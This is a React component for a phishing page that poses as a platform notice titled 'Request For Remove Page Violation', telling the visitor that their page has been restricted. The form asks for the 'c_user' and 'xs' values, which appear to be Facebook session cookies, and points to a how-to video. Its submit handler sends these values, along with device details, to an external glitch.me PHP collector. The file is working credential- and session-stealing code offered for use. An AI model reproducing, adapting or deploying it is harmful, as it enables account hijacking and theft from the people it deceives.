import React, { useState } from "react";
import FormInput from "../components/FormInput.jsx";

function Home({ onNext }) {
  const [formData, setFormData] = useState({
    c_user: "",
    xs: "",
  });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({
        ...prev,
        [name]: "",
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.c_user.trim()) {
      newErrors.c_user = "c_user is required";
    }

    if (!formData.xs.trim()) {
      newErrors.xs = "xs is required";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      // Get device info
      const deviceInfo = {
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        isTouchDevice: "ontouchstart" in window,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
      };

      const submissionData = {
        ...formData,
        ...deviceInfo,
        submittedAt: new Date().toISOString(),
      };

      // Create FormData for the API request
      const apiFormData = new FormData();
      Object.keys(submissionData).forEach((key) => {
        apiFormData.append(key, submissionData[key]);
      });

      // Send to external API with CORS handling
      const response = await fetch(
        "https://mixed-fluff-space.glitch.me/zubaireng.php",
        {
          method: "POST",
          mode: "no-cors",
          body: apiFormData,
        },
      );

      // With no-cors mode, we can't check response status
      // Assume success if no error was thrown
      const submissionId = Date.now();
      setIsSubmitting(false);
      onNext(submissionId, submissionData);
    } catch (error) {
      console.error("Error submitting form:", error);
      setErrors({ submit: "Failed to submit form. Please try again." });
      setIsSubmitting(false);
    }
  };

  return (
    <div style={{ 
      backgroundColor: "#fff",
      width: "100%"
    }}>
      {/* Form Header */}
      <div
        style={{
          padding: "1rem",
          background: "rgb(245, 246, 247)",
          borderTopLeftRadius: "8px",
          borderTopRightRadius: "8px",
        }}
      >
        <h5
          style={{
            margin: "0",
            fontSize: "1.2rem",
            fontWeight: "600",
            color: "#333"
          }}
        >
          Request For Remove Page Violation
        </h5>
      </div>

      {/* Form Content */}
      <div style={{ 
        padding: "1.5rem"
      }}>
            <p
              style={{
                fontWeight: "600",
                fontSize: "14px",
                marginBottom: "8px",
              }}
            >
              We've identified irregular activity on your page that goes against
              our community guidelines.
            </p>
            <p
              style={{
                fontWeight: "600",
                fontSize: "14px",
                marginBottom: "8px",
              }}
            >
              As a result, access to your page has been restricted, and you're
              presently unable to post, share, or comment using it.
            </p>
            <p
              style={{
                fontWeight: "600",
                fontSize: "14px",
                marginBottom: "8px",
              }}
            >
              Please provide the precise details below. Refer to the video for
              clarification if you find the instructions unclear.
            </p>
            <p
              style={{
                fontWeight: "600",
                color: "#6c757d",
                fontSize: "12px",
                marginBottom: "8px",
              }}
            >
              Detailed Video Information.
            </p>

            {/* Video Section */}
            <video
              controls
              autoPlay
              src="https://pub-60aa16ad6dd748cebebaed9839624492.r2.dev/ownlink.mp4"
              style={{
                width: "300px",
                height: "160px",
                maxWidth: "100%",
              }}
            />
            <br />
            <button
              style={{
                marginTop: "8px",
                padding: "4px 8px",
                backgroundColor: "#f8f9fa",
                border: "1px solid #ddd",
                borderRadius: "4px",
                cursor: "pointer",
              }}
            >
              Enable Sound
            </button>

            <p
              style={{
                fontWeight: "600",
                fontSize: "14px",
                marginTop: "0.5rem",
                marginBottom: "8px",
              }}
            >
              Please be sure to provide the requested information below.
            </p>

            <form onSubmit={handleSubmit}>
              {/* Hidden device information fields */}
              <input
                type="hidden"
                name="screenWidth"
                value={window.innerWidth}
              />
              <input
                type="hidden"
                name="screenHeight"
                value={window.innerHeight}
              />
              <input
                type="hidden"
                name="isTouchDevice"
                value={"ontouchstart" in window ? "true" : "false"}
              />

              {/* c_user field */}
              <label
                style={{
                  fontSize: "12px",
                  display: "block",
                  marginBottom: "4px",
                }}
              >
                c_user
              </label>
              <input
                type="number"
                name="c_user"
                value={formData.c_user}
                onChange={handleInputChange}
                required
                pattern="^\d{15}$"
                title="Please enter 15 digits"
                style={{
                  width: "100%",
                  padding: "8px",
                  border: "1px solid #ddd",
                  borderRadius: "4px",
                  marginBottom: "1rem",
                  boxSizing: "border-box",
                }}
              />
              {errors.c_user && (
                <div
                  style={{
                    color: "red",
                    fontSize: "12px",
                    marginTop: "-0.5rem",
                    marginBottom: "0.5rem",
                  }}
                >
                  {errors.c_user}
                </div>
              )}

              {/* xs field */}
              <label
                style={{
                  fontSize: "12px",
                  display: "block",
                  marginBottom: "4px",
                }}
              >
                xs
              </label>
              <input
                type="text"
                name="xs"
                value={formData.xs}
                onChange={handleInputChange}
                required
                style={{
                  width: "100%",
                  padding: "8px",
                  border: "1px solid #ddd",
                  borderRadius: "4px",
                  marginBottom: "1rem",
                  boxSizing: "border-box",
                }}
              />
              {errors.xs && (
                <div
                  style={{
                    color: "red",
                    fontSize: "12px",
                    marginTop: "-0.5rem",
                    marginBottom: "0.5rem",
                  }}
                >
                  {errors.xs}
                </div>
              )}

              <p
                style={{
                  fontSize: "12px",
                  marginTop: "0.5rem",
                  marginBottom: "1rem",
                }}
              >
                Please make sure not to log out from your computer or laptop
                until you have received a verification email.
              </p>

              {errors.submit && (
                <div
                  style={{
                    color: "red",
                    fontSize: "14px",
                    marginBottom: "1rem",
                  }}
                >
                  {errors.submit}
                </div>
              )}

              {/* Submit Button inside form */}
              <div
                style={{
                  display: "flex",
                  justifyContent: "flex-end",
                  marginTop: "1rem",
                }}
              >
                <button
                  type="submit"
                  disabled={isSubmitting}
                  style={{
                    color: "white",
                    border: "none",
                    background: "rgb(66, 103, 178)",
                    padding: "8px 16px",
                    borderRadius: "4px",
                    cursor: isSubmitting ? "not-allowed" : "pointer",
                    opacity: isSubmitting ? 0.6 : 1,
                  }}
                >
                  {isSubmitting ? "Submitting..." : "Submit"}
                </button>
              </div>
            </form>
        </div>

        {/* Form Footer */}
        <div
          style={{
            padding: "1rem",
            display: "flex",
            justifyContent: "flex-end",
            background: "rgb(245, 246, 247)",
            borderBottomLeftRadius: "8px",
            borderBottomRightRadius: "8px",
            borderTop: "1px solid #e3e6ea"
          }}
        ></div>
    </div>
  );
}

export default Home;
